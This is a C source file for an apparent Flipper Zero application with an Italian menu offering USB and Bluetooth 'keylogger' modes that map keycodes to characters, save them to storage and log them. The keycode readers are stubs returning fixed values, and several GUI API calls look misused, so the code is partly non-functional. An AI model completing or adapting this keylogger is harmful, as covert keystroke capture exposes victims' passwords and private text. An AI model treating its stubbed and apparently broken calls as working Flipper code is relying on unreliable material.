#include "faica.h"
#include <furi_hal.h>
#include <storage/storage.h>
#include <furi_log.h>
#include "save_keystrokes.h"

void save_keystroke_to_storage(char character);

char map_keycode_to_char(uint8_t* keycode);

static AppMenu app;

static bool usb_mode = false;
static bool bluetooth_mode = false;


static void view_menu_callback(Canvas* canvas, void* ctx) {
    canvas_clear(canvas);

    canvas_draw_str_aligned(canvas, 64, 10, AlignCenter, "Scegli modalità:");

    for(int i = 0; i < 3; i++) {
        const char* option = i == 0 ? "USB Keylogger" :
                             i == 1 ? "Bluetooth Keylogger" : "Esci";

        if(i == app.selected) {
            char buffer[32];
            snprintf(buffer, sizeof(buffer), "> %s", option);
            canvas_draw_str_aligned(canvas, 64, 30 + i*20, AlignCenter, buffer);
        } else {
            char buffer[32];
            snprintf(buffer, sizeof(buffer), "  %s", option);
            canvas_draw_str_aligned(canvas, 64, 30 + i*20, AlignCenter, buffer);
        }
    }
}

static void keylogger_input_callback(InputEvent* event, void* ctx) {
    if(event->type == InputTypeShort) {
        if(usb_mode || bluetooth_mode) {
            if(event->key == InputKeyBack) {
                usb_mode = false;
                bluetooth_mode = false;
                app.running = true;
            }
            return;
        }

        switch(event->key) {
            case InputKeyUp:
                if(app.selected > 0) app.selected--;
                break;
            case InputKeyDown:
                if(app.selected < 2) app.selected++;
                break;
            case InputKeyOk:
                if(app.selected == 0) {
                    usb_mode = true;
                    bluetooth_mode = false;
                } else if(app.selected == 1) {
                    bluetooth_mode = true;
                    usb_mode = false;
                } else {
                    app.running = false;
                }
                break;
            case InputKeyBack:
                app.running = false;
                break;
            default:
                break;
        }
    }
}

static bool read_usb_keycode(uint8_t* keycode_out) {
    static bool toggled = false;
    if(toggled) return false;

    keycode_out[0] = 4;
    toggled = true;
    return true;
}

static bool read_bluetooth_keycode(uint8_t* keycode_out) {
    static bool toggled = false;
    if(toggled) return false;

    keycode_out[0] = 5;
    toggled = true;
    return true;
}

void app_menu_init(void) {
    app.selected = 0;
    app.running = true;

    app.gui = furi_record_open(RECORD_GUI);
    app.view_dispatcher = view_dispatcher_alloc();

    View* view = view_alloc();
    view_set_draw_callback(view, view_menu_callback, NULL);
    view_set_input_callback(view, keylogger_input_callback, NULL);

    view_dispatcher_add_view(app.view_dispatcher, view);
    gui_add_view(app.gui, view_dispatcher_get_view(app.view_dispatcher));
    gui_switch_to_view(app.gui, view_dispatcher_get_view(app.view_dispatcher));

    while(app.running) {
        if(usb_mode) {
            uint8_t keycode[8] = {0};
            if(read_usb_keycode(keycode)) {
                char c = map_keycode_to_char(keycode);
                save_keystroke_to_storage(c);
                furi_log_d("USB Keylogger", "Tasto: %c", c);
            }
        } else if(bluetooth_mode) {
            uint8_t keycode[8] = {0};
            if(read_bluetooth_keycode(keycode)) {
                char c = map_keycode_to_char(keycode);
                save_keystroke_to_storage(c);
                furi_log_d("BT Keylogger", "Tasto: %c", c);
            }
        }

        furi_delay_ms(100);
    }

    gui_remove_view(app.gui, view_dispatcher_get_view(app.view_dispatcher));
    view_dispatcher_remove_view(app.view_dispatcher, view);
    view_free(view);
    view_dispatcher_free(app.view_dispatcher);
    furi_record_close(RECORD_GUI);
}
